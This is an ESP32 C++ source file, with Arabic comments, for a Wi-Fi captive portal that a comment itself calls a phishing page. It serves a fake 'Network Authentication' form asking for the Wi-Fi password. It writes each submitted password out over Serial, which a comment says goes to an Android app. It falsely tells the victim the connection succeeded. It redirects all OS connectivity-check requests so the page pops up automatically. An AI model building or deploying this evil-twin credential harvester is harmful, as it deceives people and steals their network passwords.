#include "portal.h"
#include <ESPAsyncWebServer.h>

// صفحة HTML الخاصة بصفحة التصيد
const char CAPTIVE_HTML_PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi Network Authentication</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #1c1e21;
        }
        .container {
            background: #ffffff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 { margin-bottom: 8px; font-size: 22px; color: #1877f2; }
        p { font-size: 14px; color: #65676b; margin-bottom: 24px; }
        .form-group { margin-bottom: 16px; text-align: left; }
        label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #4b4f56; }
        input[type="password"] {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #ccd0d5;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }
        input[type="password"]:focus { border-color: #1877f2; }
        button {
            width: 100%;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        button:hover { background-color: #166fe5; }
        .footer { margin-top: 20px; font-size: 11px; color: #8a8d91; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Network Authentication</h2>
        <p>This network requires authentication before accessing the internet.</p>
        
        <form action="/login" method="POST" id="wifiForm">
            <div class="form-group">
                <label for="password">Wi-Fi Password</label>
                <input type="password" id="password" name="password" required placeholder="Enter network password">
            </div>
            <button type="submit" id="connectBtn">Connect to Internet</button>
        </form>
        
        <div class="footer">Secure Wi-Fi Provisioning Portal</div>
    </div>
</body>
</html>
)rawliteral";

// تنفيذ الدوال الخاصة بـ PortalManager مباشرة دون إعادة تعريف الكلاس

PortalManager::PortalManager() {
    server = new AsyncWebServer(80);
}

void PortalManager::begin() {
    // 1. الصفحة الرئيسية
    server->on("/", HTTP_GET, [](AsyncWebServerRequest *request){
        request->send_P(200, "text/html", CAPTIVE_HTML_PAGE);
    });

    // 2. استقبال بيانات تسجيل الدخول ومعالجتها وإرسالها للأندرويد عبر Serial
    server->on("/login", HTTP_ANY, [](AsyncWebServerRequest *request){
        String password = "";

        if (request->hasParam("password", true)) {
            password = request->getParam("password", true)->value();
        } else if (request->hasParam("password", false)) {
            password = request->getParam("password", false)->value();
        }

        if (password.length() > 0) {
            Serial.printf("{\"event\":\"captive_data\",\"password\":\"%s\"}\n", password.c_str());
            Serial.flush();
        }

        String successResponse = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
                                 "<style>body{font-family:sans-serif;text-align:center;padding-top:50px;background:#f4f4f9;color:#333;}"
                                 "h2{color:#28a745;}</style></head><body>"
                                 "<h2>Connected Successfully</h2>"
                                 "<p>Your device is now connected to the network. You may close this window.</p>"
                                 "</body></html>";
        request->send(200, "text/html", successResponse);
    });

    // 3. معالج طلبات فحص الاتصال وإجبار الهاتف على فتح البورتال تلقائياً (Auto-Popup)
    server->onNotFound([](AsyncWebServerRequest *request){
        String url = request->url();
        
        if (url.indexOf("generate_204") != -1 || 
            url.indexOf("gen_204") != -1 || 
            url.indexOf("hotspot-detect") != -1 || 
            url.indexOf("library/test") != -1 || 
            url.indexOf("ncsi.txt") != -1 || 
            url.indexOf("connectivitycheck") != -1) {
            
            request->redirect("http://192.168.4.1/");
            return;
        }

        request->redirect("http://192.168.4.1/");
    });

    server->begin();
}

void PortalManager::update() {
    // دورة التحديث
}

void PortalManager::stop() {
    if (server) {
        server->end();
        delete server;
        server = nullptr;
    }
}

void PortalManager::setHtmlChunk(const char* chunk) {}

void PortalManager::start(const char* ssid, const char* password) {
    begin();
}

void PortalManager::resetHtml(size_t size) {}
